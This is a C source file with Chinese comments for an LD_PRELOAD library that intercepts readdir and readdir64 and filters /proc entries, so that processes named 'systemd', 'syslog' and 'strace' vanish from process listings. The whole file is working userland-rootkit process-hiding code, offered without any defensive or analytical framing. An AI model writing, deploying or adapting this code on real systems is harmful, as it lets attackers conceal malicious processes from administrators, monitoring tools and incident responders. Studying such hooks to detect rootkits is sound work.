#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * 每个名称在这里的进程都会被隐藏
 */
static const char* process_to_filter[] = {"systemd", "syslog", "strace"};

/*
 * 获取目录的路径
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = '\0';
    return 1;
}

/*
 * 根据PID获取进程名称
 */
static int get_process_name(const char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%255[^)]s", &unused, buf);
    return 1;
}

/*
 * 定义拦截函数 readdir
 */
static struct dirent* (*original_readdir)(DIR*) = NULL;
static struct dirent64* (*original_readdir64)(DIR*) = NULL;

struct dirent* readdir(DIR *dirp)                                       
{                                                                       
    if(original_readdir == NULL) {                                     
        original_readdir = (struct dirent* (*)(DIR*)) dlsym(RTLD_NEXT, "readdir");               
        if(original_readdir == NULL)                                   
        {                                                              
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());        
            return NULL;                                               
        }                                                              
    }                                                                  

    struct dirent* dir;                                                 
    char dir_name[256];                                                 
    char process_name[256];                                             
    int i;                                                              

    while (1) { 
        dir = original_readdir(dirp); 
        if (!dir) break; 
    
        if (get_dir_name(dirp, dir_name, sizeof(dir_name))) {
            if (strcmp(dir_name, "/proc") == 0 && get_process_name(dir->d_name, process_name)) {
                int exclude_process = 0;
                for (i = 0; i < (int)(sizeof(process_to_filter) / sizeof(process_to_filter[0])); i++) {
                    if (strcmp(process_name, process_to_filter[i]) == 0) {
                        exclude_process = 1;
                        break;
                    }
                }
                if (exclude_process) continue; 
            }
        }
        return dir; 
    }
    return NULL;
}

/*
 * 定义拦截函数 readdir64
 */
struct dirent64* readdir64(DIR *dirp)                                       
{                                                                       
    if(original_readdir64 == NULL) {                                     
        original_readdir64 = (struct dirent64* (*)(DIR*)) dlsym(RTLD_NEXT, "readdir64");               
        if(original_readdir64 == NULL)                                   
        {                                                              
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());        
            return NULL;                                               
        }                                                              
    }                                                                  

    struct dirent64* dir;                                                 
    char dir_name[256];                                                 
    char process_name[256];                                             
    int i;                                                              

    while (1) { 
        dir = original_readdir64(dirp); 
        if (!dir) break; 
    
        if (get_dir_name(dirp, dir_name, sizeof(dir_name))) {
            if (strcmp(dir_name, "/proc") == 0 && get_process_name(dir->d_name, process_name)) {
                int exclude_process = 0;
                for (i = 0; i < (int)(sizeof(process_to_filter) / sizeof(process_to_filter[0])); i++) {
                    if (strcmp(process_name, process_to_filter[i]) == 0) {
                        exclude_process = 1;
                        break;
                    }
                }
                if (exclude_process) continue; 
            }
        }
        return dir; 
    }
    return NULL;
}
